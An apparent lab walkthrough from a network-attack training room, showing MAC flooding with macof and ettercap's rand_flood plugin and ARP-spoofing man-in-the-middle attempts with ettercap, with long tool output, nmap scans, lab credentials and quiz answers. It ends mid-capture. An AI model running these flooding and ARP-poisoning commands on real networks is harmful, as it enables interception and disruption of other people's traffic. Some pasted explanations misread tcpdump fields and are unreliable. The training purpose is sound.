5f:3c:47:1a:10:c f:95:17:30:ae:4d 0.0.0.0.19167 > 0.0.0.0.59542: S 1999753976:1999753976(0) win 512
d6:cc:3b:63:45:f6 34:a5:5c:6b:e8:77 0.0.0.0.31699 > 0.0.0.0.7321: S 1793164719:1793164719(0) win 512
3:c4:72:5b:d3:47 10:6e:da:35:d6:bc 0.0.0.0.11714 > 0.0.0.0.4682: S 5097922:5097922(0) win 512
8c:55:27:79:b6:20 ad:5a:9d:39:da:13 0.0.0.0.19965 > 0.0.0.0.14660: S 361171648:361171648(0) win 512
....

This is a command used in the command-line interface of the `macof` tool. The options used in the command are:

-   `-i eth1`: This option specifies the interface to be used, in this case, Ethernet interface 1.

`macof` is a tool for generating random MAC addresses, which are used to identify devices on a network. In this command, the `-i` option is specifying the network interface through which the MAC addresses will be generated and transmitted.

Note: The use of `macof` for malicious purposes is illegal and unethical, and it should only be used for educational or research purposes.

   
┌──(kali㉿kali)-[~/learning_l2_mac]
└─$ scp admin@10.10.132.221:/tmp/tcpdump2.pcap .
admin@10.10.132.221's password: 
tcpdump2.pcap                         100% 4079KB 564.7KB/s   00:07    
                                                                        
┌──(kali㉿kali)-[~/learning_l2_mac]
└─$ wireshark tcpdump2.pcap

-   `d3:aa:6f:2c:b:38 70:91:f0:b:d3:c7`: The first two fields represent the source and destination MAC addresses of the packet, respectively.
-   `0.0.0.0.675 > 0.0.0.0.28025`: The next two fields represent the source and destination IP addresses of the packet, respectively. Note that the IP addresses here appear to be formatted incorrectly, as they contain multiple dots.
-   `S`: This represents the packet type, in this case, a "SYN" packet. SYN packets are used to initiate a TCP connection.
-   `1665627953:1665627953(0)`: This field represents the sequence number and acknowledgment number of the packet.
-   `win 512`: This field represents the "window size" of the packet, which determines the maximum amount of data that can be sent in a single TCP segment.

uhmm same like before

root@eve:/tmp# ettercap -T -i eth1 -P rand_flood -q -w /tmp/tcpdump2.pcap

ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team

Listening on:
  eth1 -> 82:5C:E6:FA:1C:C0
	  192.168.12.66/255.255.255.0
	  fe80::c4ae:baff:fe8a:42e9/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
24609 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

1 hosts added to the hosts list...
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help

Activating rand_flood plugin...

rand_flood: Start flooding the LAN...
Closing text interface...


Terminating ettercap...
Lua cleanup complete!
Unified sniffing was stopped.


This is a command used in the command-line interface of the Ettercap tool. The options used in the command are:

-   `-T`: This option sets the text-only interface mode.
    
-   `-i eth1`: This option specifies the interface to be used, in this case, Ethernet interface 1.
    
-   `-P rand_flood`: This option sets the flood attack mode. The `rand_flood` option specifies a random flood attack, which is a type of denial-of-service (DoS) attack that involves sending a large number of random packets to a target network.
    
-   `-q`: This option is used to run Ettercap in quiet mode, which suppresses output messages.
    
-   `-w /tmp/tcpdump3.pcap`: This option writes the captured packets to a file in the PCAP format. The file will be saved in the `/tmp` directory with the name `tcpdump3.pcap`.
    

Note: The use of Ettercap for malicious purposes is illegal and unethical, and it should only be used for educational or research purposes.

root@eve:~# nmap -sn 192.168.12.66/24
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-06 16:22 UTC
Nmap scan report for bob (192.168.12.2)
Host is up (0.00021s latency).
MAC Address: 00:50:79:66:68:01 (Private)
Nmap scan report for eve (192.168.12.66)
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.82 seconds

I see the problem alice is off

restarting machine

ip.src == 192.168.12.1

now work :)


```

![[Pasted image 20230206114216.png]]

What kind of packets is Alice continuously sending to Bob?   

Which layer 3 protocol?

*icmp*

What's the size of their data section? (bytes)

"Data (**** bytes)"

*1337*


### Man-in-the-Middle: Intro to ARP Spoofing

As you may have noticed, MAC Flooding can be considered a real "noisy" technique. In order to reduce the risk of detection and DoS we will leave **macof** aside for now. Instead, we are going to perform so-called **ARP cache poisoning** attacks against Alice and Bob, in an attempt to become a fully-fledged [Man-in-the-Middle](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) (MITM).

For a deeper understanding of this technique, read the Wikipedia article on [ARP spoofing](https://en.wikipedia.org/wiki/ARP_spoofing).

_**tl;dr –** "an attacker sends (spoofed) ARP messages […] to associate the attacker's MAC address with the IP address of another host […] causing any traffic meant for that IP address to be sent to the attacker instead. ARP spoofing may allow an attacker to **intercept** data frames on a network, **modify** the traffic, or stop all traffic. Often the attack is used as an opening for other attacks, such as denial of service, **man in the middle**, or session hijacking attacks."_ _-_ [_Wikipedia - ARP spoofing_](https://en.wikipedia.org/wiki/ARP_spoofing)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9955140ab79a04b28162eb/room-content/53adfdaeec3bdfa65af7b1342cc77c2c.png)  

_[https://commons.wikimedia.org/wiki/File:ARP_Spfing.svg](https://commons.wikimedia.org/wiki/File:ARP_Spoofing.svg)_  

There are, however, measures and controls available to detect and prevent such attacks. In the current scenario, both hosts are running an ARP implementation that takes pains to validate incoming ARP replies. Without further ado, we are using **ettercap** to launch an ARP Spoofing attack against Alice and Bob and see how they react:

`ettercap -T -i eth1 -M arp`  

Answer the questions below

```
ARP (Address Resolution Protocol) cache poisoning, also known as ARP spoofing, is a type of network attack in which an attacker sends false ARP messages to a network, causing the mapping between IP addresses and MAC addresses to become incorrect. This results in the attacker being able to intercept, modify, or redirect network traffic intended for other devices on the network.

The attack works by tricking the target device into believing that the attacker's MAC address is associated with the IP address of another device on the network, such as a router or server. This causes the target device to send all its network traffic to the attacker instead of its intended destination. The attacker can then use this intercepted traffic to steal sensitive information, inject malware, or perform other malicious actions.

To prevent ARP cache poisoning, network administrators can use techniques such as static ARP entries, ARP inspection, and IP/MAC binding. Additionally, using encrypted protocols like HTTPS and VPNs can help protect against ARP cache poisoning attacks.

A man-in-the-middle (MITM) attack is a type of security attack in which an attacker intercepts and alters communication between two parties. In this type of attack, the attacker intercepts communication by positioning themselves between the two communicating parties and masquerading as the intended recipient of the communication. The attacker can then modify the communication before passing it on to the intended recipient, effectively allowing them to control or manipulate the flow of information.

MITM attacks can be performed in various ways, such as ARP spoofing, DNS spoofing, and wireless eavesdropping. The goal of these attacks is often to steal sensitive information, such as passwords, credit card numbers, or other sensitive data.

To prevent MITM attacks, it is important to use encryption technologies such as HTTPS and SSL, use secure protocols like SSL/TLS, and verify the identity of websites and servers using secure certificates. Additionally, using strong passwords, regularly updating software and applications, and being cautious of suspicious emails or links can also help prevent these types of attacks.


root@eve:~# ettercap -T -i eth1 -M arp

ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team

Listening on:
  eth1 -> 0E:3B:9B:F3:C9:75
	  192.168.12.66/255.255.255.0
	  fe80::34f2:9ff:fe2e:7638/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
24609 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
/ |=========>                                         |  16.08 %

Mon Feb  6 16:51:22 2023 [221951]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:22 2023 [221980]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)
/ |===========================>                       |  53.73 %

Mon Feb  6 16:51:25 2023 [237045]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:25 2023 [237071]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)
/ |=============================================>     |  89.80 %

Mon Feb  6 16:51:28 2023 [258116]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:28 2023 [258141]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)
* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : ANY (all the hosts in the list)

 GROUP 2 : ANY (all the hosts in the list)
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help



Mon Feb  6 16:51:30 2023 [129061]
  192.168.12.2:0 --> 192.168.12.1:0 |  (0)


Mon Feb  6 16:51:30 2023 [129277]
  192.168.12.1:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:51:30 2023 [172450]
  192.168.12.1:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:51:30 2023 [172592]
  192.168.12.2:0 --> 192.168.12.1:0 |  (0)


Mon Feb  6 16:51:31 2023 [267043]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:31 2023 [267070]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:51:34 2023 [268103]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:34 2023 [268132]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:51:37 2023 [271384]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:37 2023 [271413]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:51:40 2023 [276214]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:40 2023 [276246]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:51:43 2023 [292727]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:43 2023 [292756]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:51:46 2023 [304946]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:46 2023 [304977]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:51:49 2023 [306119]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:49 2023 [306155]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:51:52 2023 [311012]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:52 2023 [311043]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:51:55 2023 [317962]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:55 2023 [318029]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:51:58 2023 [383605]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:51:58 2023 [383645]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:01 2023 [550025]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:01 2023 [550056]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:04 2023 [558717]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:04 2023 [558744]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:07 2023 [571144]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:07 2023 [571174]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:10 2023 [575564]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:10 2023 [575595]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:13 2023 [587796]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:13 2023 [587826]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:16 2023 [603934]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:16 2023 [603963]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:19 2023 [614197]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:19 2023 [614243]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:22 2023 [628388]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:22 2023 [628417]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:25 2023 [639180]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:25 2023 [639213]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:28 2023 [653486]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:28 2023 [653542]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:31 2023 [670502]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:31 2023 [670563]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:34 2023 [688395]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:34 2023 [688421]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:37 2023 [721178]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:37 2023 [721208]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:40 2023 [746239]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:40 2023 [746271]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:43 2023 [771222]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:43 2023 [771253]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:46 2023 [788065]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:46 2023 [788110]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:49 2023 [795742]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:49 2023 [795772]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:52 2023 [816883]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:52 2023 [816915]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:55 2023 [820864]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:55 2023 [820893]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:52:58 2023 [830620]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:52:58 2023 [830650]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:01 2023 [843976]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:01 2023 [844014]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:04 2023 [864966]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:04 2023 [865000]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:07 2023 [866256]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:07 2023 [866287]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:10 2023 [870539]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:10 2023 [870573]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:13 2023 [883192]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:13 2023 [883225]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:16 2023 [891881]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:16 2023 [891913]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:19 2023 [904389]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:19 2023 [904420]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:22 2023 [908831]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:22 2023 [908863]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:25 2023 [917842]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:25 2023 [917873]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:28 2023 [930954]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:28 2023 [930985]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:31 2023 [951517]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:31 2023 [951548]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:34 2023 [955913]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:34 2023 [955946]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)


Mon Feb  6 16:53:37 2023 [967419]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:37 2023 [967452]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)
Closing text interface...


Terminating ettercap...
Lua cleanup complete!
ARP poisoner deactivated.
RE-ARPing the victims...


Mon Feb  6 16:53:40 2023 [976672]
  192.168.12.2:0 --> 192.168.12.66:0 | P (0)


Mon Feb  6 16:53:40 2023 [976702]
  192.168.12.66:0 --> 192.168.12.2:0 |  (0)
Unified sniffing was stopped.

La salida muestra información sobre el tráfico en la red, pero no se menciona la ejecución exitosa de un ataque de suplantación de ARP o de sniffing de tráfico.

Anyway, Ettercap can establish a Man-in-the-Middle (MITM) attack between Alice and Bob, given that Ettercap is a tool that can perform various network attacks including MITM. However, it is important to note that performing any unauthorized network activity is illegal and unethical.
```

Can ettercap establish a MITM in between Alice and Bob? (Yay/Nay)  

*Nay*

Would you expect a different result when attacking hosts without ARP packet validation enabled? (Yay/Nay)

*Yay*

### Man-in-the-Middle: Sniffing

 Start Machine

In this somewhat altered scenario, Alice and Bob are running a different OS (Ubuntu) with its default ARP implementation and no protective controls on their machines. As in the previous task, try to establish a MITM using **ettercap** and see if Ubuntu (by default) is falling prey to it.

After starting the VM attached to this task, you can log on via SSH with the same credentials as before:

Username: **admin**  
Password: **Layer2**

_As with the previous machine, please, also allow a minimum of **5 minutes** for this box to spin up, **then** try connecting with SSH (if you login, and the command line isn't showing up yet, **don't hit Ctrl+C!** Just be patient…)_

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ ssh admin@10.10.148.6  
The authenticity of host '10.10.148.6 (10.10.148.6)' can't be established.
ED25519 key fingerprint is SHA256:QKJ7M2afSUAQcRjyw4fi0Jb4Hik8yPJz4AQI2rAr63A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:268: [hashed name]
    ~/.ssh/known_hosts:270: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.148.6' (ED25519) to the list of known hosts.
admin@10.10.148.6's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

25 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

         __/\\\______________/\\\_________________/\\\\\\___________________________________________________________________        
          _\/\\\_____________\/\\\________________\////\\\___________________________________________________________________       
           _\/\\\_____________\/\\\___________________\/\\\___________________________________________________________________      
            _\//\\\____/\\\____/\\\______/\\\\\\\\_____\/\\\________/\\\\\\\\_____/\\\\\_______/\\\\\__/\\\\\_______/\\\\\\\\__     
             __\//\\\__/\\\\\__/\\\_____/\\\/////\\\____\/\\\______/\\\//////____/\\\///\\\___/\\\///\\\\\///\\\___/\\\/////\\\_    
              ___\//\\\/\\\/\\\/\\\_____/\\\\\\\\\\\_____\/\\\_____/\\\__________/\\\__\//\\\_\/\\\_\//\\\__\/\\\__/\\\\\\\\\\\__   
               ____\//\\\\\\//\\\\\_____\//\\///////______\/\\\____\//\\\________\//\\\__/\\\__\/\\\__\/\\\__\/\\\_\//\\///////___  
                _____\//\\\__\//\\\_______\//\\\\\\\\\\__/\\\\\\\\\__\///\\\\\\\\__\///\\\\\/___\/\\\__\/\\\__\/\\\__\//\\\\\\\\\\_ 
                 ______\///____\///_________\//////////__\/////////_____\////////_____\/////_____\///___\///___\///____\//////////__
                    ________________________________________________________________/\\\________________________        
                     _______________________________________________________________\/\\\________________________       
                      _____/\\\____________________________________________/\\\______\/\\\________________________      
                       __/\\\\\\\\\\\_____/\\\\\_________________________/\\\\\\\\\\\_\/\\\_____________/\\\\\\\\__     
                        _\////\\\////____/\\\///\\\______________________\////\\\////__\/\\\\\\\\\\____/\\\/////\\\_    
                         ____\/\\\_______/\\\__\//\\\________________________\/\\\______\/\\\/////\\\__/\\\\\\\\\\\__   
                          ____\/\\\_/\\__\//\\\__/\\\_________________________\/\\\_/\\__\/\\\___\/\\\_\//\\///////___  
                           ____\//\\\\\____\///\\\\\/__________________________\//\\\\\___\/\\\___\/\\\__\//\\\\\\\\\\_ 
                            _____\/////_______\/////_____________________________\/////____\///____\///____\//////////__
               __/\\\\\\\\\\\\________________________________________________________________________________________        
                _\/\\\////////\\\______________________________________________________________________________________       
                 _\/\\\______\//\\\_______________________________/\\\\\\\\_____________________________________________      
                  _\/\\\_______\/\\\__/\\\____/\\\__/\\/\\\\\\____/\\\////\\\_____/\\\\\\\\______/\\\\\_____/\\/\\\\\\___     
                   _\/\\\_______\/\\\_\/\\\___\/\\\_\/\\\////\\\__\//\\\\\\\\\___/\\\/////\\\___/\\\///\\\__\/\\\////\\\__    
                    _\/\\\_______\/\\\_\/\\\___\/\\\_\/\\\__\//\\\__\///////\\\__/\\\\\\\\\\\___/\\\__\//\\\_\/\\\__\//\\\_   
                     _\/\\\_______/\\\__\/\\\___\/\\\_\/\\\___\/\\\__/\\_____\\\_\//\\///////___\//\\\__/\\\__\/\\\___\/\\\_  
                      _\/\\\\\\\\\\\\/___\//\\\\\\\\\__\/\\\___\/\\\_\//\\\\\\\\___\//\\\\\\\\\\__\///\\\\\/___\/\\\___\/\\\_ 
                       _\////////////______\/////////___\///____\///___\////////_____\//////////_____\/////_____\///____\///__
             ______________________/\\\\\___________________________/\\\\\__________/\\\\\\\\\\\____/\\\\\\\\\\\_______        
              ____________________/\\\///__________________________/\\\///\\\______/\\\/////////\\\_\/////\\\///________       
               ___________________/\\\____________________________/\\\/__\///\\\___\//\\\______\///______\/\\\___________      
                _____/\\\\\_____/\\\\\\\\\________________________/\\\______\//\\\___\////\\\_____________\/\\\___________     
                 ___/\\\///\\\__\////\\\//________________________\/\\\_______\/\\\______\////\\\__________\/\\\______/\\\_    
                  __/\\\__\//\\\____\/\\\__________________________\//\\\______/\\\__________\////\\\_______\/\\\_____\///__   
                   _\//\\\__/\\\_____\/\\\___________________________\///\\\__/\\\_____/\\\______\//\\\______\/\\\___________  
                    __\///\\\\\/______\/\\\_____________________________\///\\\\\/_____\///\\\\\\\\\\\/____/\\\\\\\\\\\__/\\\_ 
                     ____\/////________\///________________________________\/////_________\///////////_____\///////////__\///__
       __/\\\_________________/\\\\\\\\\_____/\\\________/\\\__/\\\\\\\\\\\\\\\____/\\\\\\\\\__________________/\\\\\\\\\_____        
        _\/\\\_______________/\\\\\\\\\\\\\__\///\\\____/\\\/__\/\\\///////////___/\\\///////\\\______________/\\\///////\\\___       
         _\/\\\______________/\\\/////////\\\___\///\\\/\\\/____\/\\\_____________\/\\\_____\/\\\_____________\///______\//\\\__      
          _\/\\\_____________\/\\\_______\/\\\_____\///\\\/______\/\\\\\\\\\\\_____\/\\\\\\\\\\\/________________________/\\\/___     
           _\/\\\_____________\/\\\\\\\\\\\\\\\_______\/\\\_______\/\\\///////______\/\\\//////\\\_____________________/\\\//_____    
            _\/\\\_____________\/\\\/////////\\\_______\/\\\_______\/\\\_____________\/\\\____\//\\\_________________/\\\//________   
             _\/\\\_____________\/\\\_______\/\\\_______\/\\\_______\/\\\_____________\/\\\_____\//\\\______________/\\\/___________  
              _\/\\\\\\\\\\\\\\\_\/\\\_______\/\\\_______\/\\\_______\/\\\\\\\\\\\\\\\_\/\\\______\//\\\____________/\\\\\\\\\\\\\\\_ 
               _\///////////////__\///________\///________\///________\///////////////__\///________\///____________\///////////////__
____/\\\__/\\\______________________________________________________________________________________________________________________        
 ___\/\\\_\/\\\______________________________________________________________________________________________________________________       
  __/\\\\\\\\\\\\\____________________/\\\__________/\\\__________________________________________________________________/\\\\\\\\\__      
   _\///\\\///\\\/______/\\\\\\\\___/\\\\\\\\\\\__/\\\\\\\\\\\_____/\\\\\\\\___/\\/\\\\\\\______/\\\\\\\\__/\\\\\\\\\_____/\\\/////\\\_     
    ___\/\\\_\/\\\_____/\\\/////\\\_\////\\\////__\////\\\////____/\\\/////\\\_\/\\\/////\\\___/\\\//////__\////////\\\___\/\\\\\\\\\\__    
     __/\\\\\\\\\\\\\__/\\\\\\\\\\\_____\/\\\_________\/\\\_______/\\\\\\\\\\\__\/\\\___\///___/\\\___________/\\\\\\\\\\__\/\\\//////___   
      _\///\\\///\\\/__\//\\///////______\/\\\_/\\_____\/\\\_/\\__\//\\///////___\/\\\_________\//\\\_________/\\\/////\\\__\/\\\_________  
       ___\/\\\_\/\\\____\//\\\\\\\\\\____\//\\\\\______\//\\\\\____\//\\\\\\\\\\_\/\\\__________\///\\\\\\\\_\//\\\\\\\\/\\_\/\\\_________ 
        ___\///__\///______\//////////______\/////________\/////______\//////////__\///_____________\////////___\////////\//__\///__________


admin@eve:~$ sudo su -
[sudo] password for admin: 
root@eve:~# ip a s eth1
8: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 0e:d9:c1:ed:a6:c1 brd ff:ff:ff:ff:ff:ff
    inet 192.168.12.66/24 brd 192.168.12.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::8862:1aff:fee7:9471/64 scope link 
       valid_lft forever preferred_lft forever

root@eve:~# nmap -n 192.168.12.66/24
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-06 17:13 UTC
Nmap scan report for 192.168.12.10
Host is up (0.078s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
4444/tcp open  krb524
MAC Address: D2:57:A7:74:E2:65 (Unknown)

Nmap scan report for 192.168.12.20
Host is up (0.037s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 3E:77:4D:F0:14:DB (Unknown)

Nmap scan report for 192.168.12.66
Host is up (0.0000080s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
5002/tcp open  rfe

Nmap done: 256 IP addresses (3 hosts up) scanned in 7.08 seconds

root@eve:~# tcpdump -vvA -i eth1
tcpdump: listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
17:15:52.920853 IP6 (hlim 255, next-header ICMPv6 (58) payload length: 16) fe80::d057:a7ff:fe74:e265 > ip6-allrouters: [icmp6 sum ok] ICMP6, router solicitation, length 16
	  source link-address option (1), length 8 (1): d2:57:a7:74:e2:65
	    0x0000:  d257 a774 e265
`.....:..........W...t.e...........................W.t.e
17:16:15.448865 IP6 (hlim 255, next-header ICMPv6 (58) payload length: 16) fe80::3c77:4dff:fef0:14db > ip6-allrouters: [icmp6 sum ok] ICMP6, router solicitation, length 16
	  source link-address option (1), length 8 (1): 3e:77:4d:f0:14:db
	    0x0000:  3e77 4df0 14db
`.....:.........<wM.......................<.......>wM...
^C
2 packets captured
2 packets received by filter
0 packets dropped by kernel

root@eve:~# ettercap -T -i eth1 -M arp

ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team

Listening on:
  eth1 -> 0E:D9:C1:ED:A6:C1
	  192.168.12.66/255.255.255.0
	  fe80::8862:1aff:fee7:9471/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
24609 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : ANY (all the hosts in the list)

 GROUP 2 : ANY (all the hosts in the list)
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help



Mon Feb  6 17:17:09 2023 [991844]
